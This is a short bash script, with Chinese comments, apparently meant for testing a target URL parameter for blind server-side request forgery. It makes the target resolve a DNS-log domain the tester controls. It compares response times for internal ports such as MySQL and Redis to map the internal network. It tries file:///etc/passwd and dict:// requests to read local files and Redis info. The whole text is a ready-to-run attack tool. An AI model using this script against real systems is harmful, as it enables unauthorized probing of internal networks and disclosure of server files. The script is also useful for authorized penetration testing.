#!/usr/bin/env bash
PREFIX="${1:?usage: bash ssrf-blind.sh 'http://TARGET/path?url=' <DNSLOG>}"
DOMAIN="${2:?usage: bash ssrf-blind.sh 'http://TARGET/path?url=' <DNSLOG>}"
R=$(date +%s)$RANDOM
BASE="${PREFIX%%=*}="
echo '--- 1) DNS 外带（看 DNSLOG 有没有解析）'
curl -sS -m 8 --get "$BASE" --data-urlencode "url=http://$R.$DOMAIN/" -o /dev/null -w 'dns-probe=%{http_code}\n'
echo '--- 2) 时间差（内网端口 vs 不存在的端口）'
for t in 127.0.0.1:3306 127.0.0.1:6379 127.0.0.1:1; do
  printf '%-16s ' "$t"
  curl -sS -m 12 --get "$BASE" --data-urlencode "url=http://$t/" -o /dev/null -w '%{time_total}\n'
done
echo '--- 3) file / dict 协议'
for u in 'file:///etc/passwd' 'dict://127.0.0.1:6379/info'; do
  printf '%-28s ' "$u"
  curl -sS -m 8 --get "$BASE" --data-urlencode "url=$u" | head -c 80; echo
done
# 判定：DNS 有解析 = SSRF 成立；#2 里开放端口的 time_total 明显大于不存在端口 = 可探内网
